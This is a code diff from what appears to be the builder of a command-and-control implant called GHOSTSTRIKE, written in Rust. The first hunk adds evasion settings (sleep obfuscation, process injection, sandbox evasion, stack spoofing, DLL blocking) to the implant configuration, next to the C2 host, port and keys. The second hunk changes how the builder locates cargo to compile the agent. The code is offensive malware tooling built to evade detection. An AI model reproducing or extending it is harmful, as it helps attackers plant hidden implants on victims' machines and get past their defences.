@@ -25,18 +25,23 @@ use crate::mutator::Mutator;
 pub async fn generate(cfg: BuildConfig, output_path: &str) -> Result<String> {
     let build_id = Uuid::new_v4().to_string();
 
-    // 1. Inject build_id and serialise config.
+    // 1. Inject build_id and serialise config (all evasion flags included).
     let agent_cfg = serde_json::json!({
-        "c2_host":      cfg.c2_host,
-        "c2_port":      cfg.c2_port,
-        "protocol":     cfg.protocol,
-        "sleep_ms":     cfg.sleep_ms,
-        "jitter_pct":   cfg.jitter_pct,
-        "dns_domain":   cfg.dns_domain,
-        "pipe_name":    cfg.pipe_name,
-        "build_id":     build_id,
-        "c2_key":       cfg.c2_key,
-        "server_pubkey": cfg.server_pubkey,
+        "c2_host":        cfg.c2_host,
+        "c2_port":        cfg.c2_port,
+        "protocol":       cfg.protocol,
+        "sleep_ms":       cfg.sleep_ms,
+        "jitter_pct":     cfg.jitter_pct,
+        "dns_domain":     cfg.dns_domain,
+        "pipe_name":      cfg.pipe_name,
+        "build_id":       build_id,
+        "c2_key":         cfg.c2_key,
+        "server_pubkey":  cfg.server_pubkey,
+        "sleep_obf":      cfg.sleep_obf,
+        "injection":      cfg.injection,
+        "sandbox_evasion": cfg.sandbox_evasion,
+        "stack_spoof":    cfg.stack_spoof,
+        "block_dlls":     cfg.block_dlls,
     });
     let plain = serde_json::to_vec(&agent_cfg)?;
 
@@ -131,26 +136,24 @@ fn compile_agent(
     ];
     args.extend(bin_arg.iter().map(|s| *s));
 
-    // Ensure ~/.cargo/bin is on PATH so cargo is found when this binary
-    // is launched without a full shell environment (e.g. from a TUI).
-    let path_env = {
-        let cargo_home = std::env::var("CARGO_HOME")
-            .or_else(|_| std::env::var("HOME").map(|h| format!("{h}/.cargo")))
-            .unwrap_or_default();
-        let cargo_bin = format!("{cargo_home}/bin");
-        let current = std::env::var("PATH").unwrap_or_default();
-        if current.contains(&cargo_bin) {
-            current
-        } else {
-            format!("{cargo_bin}:{current}")
-        }
-    };
+    // Resolve absolute path to cargo binary so this works when the binary
+    // is launched without a full shell (no ~/.cargo/bin in PATH).
+    // Priority: CARGO env var (set by rustup) → ~/.cargo/bin/cargo → "cargo"
+    let cargo_bin = std::env::var("CARGO").ok()
+        .or_else(|| {
+            std::env::var("HOME").ok().and_then(|home| {
+                let p = format!("{home}/.cargo/bin/cargo");
+                std::path::Path::new(&p).exists().then_some(p)
+            })
+        })
+        .unwrap_or_else(|| "cargo".to_string());
 
-    let status = Command::new("cargo")
+    println!("[*] cargo:           {cargo_bin}");
+
+    let status = Command::new(&cargo_bin)
         .args(&args)
         .env("OUT_DIR", out_dir)
         .env("GHOSTSTRIKE_BUILD_ID", build_id)
-        .env("PATH", path_env)
         .current_dir(workspace_root)
         .status()
         .context("cargo build failed")?;
